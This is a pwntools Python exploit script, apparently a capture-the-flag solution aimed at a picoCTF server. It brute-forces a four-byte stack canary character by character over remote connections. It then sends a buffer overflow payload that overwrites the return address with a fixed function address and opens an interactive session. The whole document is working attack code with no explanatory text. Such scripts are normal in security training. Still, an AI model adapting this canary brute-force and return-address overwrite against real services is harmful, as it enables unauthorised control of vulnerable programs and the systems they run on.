from pwn import *
from string import ascii_letters, digits

testing_chars = ascii_letters + digits

context.log_level = "CRITICAL"

elf = context.binary = ELF("./vuln")
host, port = "saturn.picoctf.net", 59995

canary = ""

while len(canary) < 4:
    for char in testing_chars:
        print(f"Trying: {char}")
        try:
            conn = remote(host, port)

            payload = b"A" * 64
            canary_test = canary.encode() + char.encode()
            payload += canary_test

            length = str(len(payload)).encode()

            conn.recvuntil(b"> ")
            conn.sendline(length)
            conn.recvuntil(b"> ")
            conn.sendline(payload)
            stack_smashing = conn.recvline()
            if b"Stack" in stack_smashing:
                conn.close()
                continue
            conn.close()
            canary += char
            print(f"Canary: {canary}")
            break
        except:
            conn.close()
            continue


conn = remote(host, port)

payload = b"A" * 64
payload += canary.encode()
payload += b"B" * 16
payload += p32(0x08049336)

length = str(len(payload)).encode()

conn.recvuntil(b"> ")
conn.sendline(length)
conn.recvuntil(b"> ")
conn.sendline(payload)

conn.interactive()
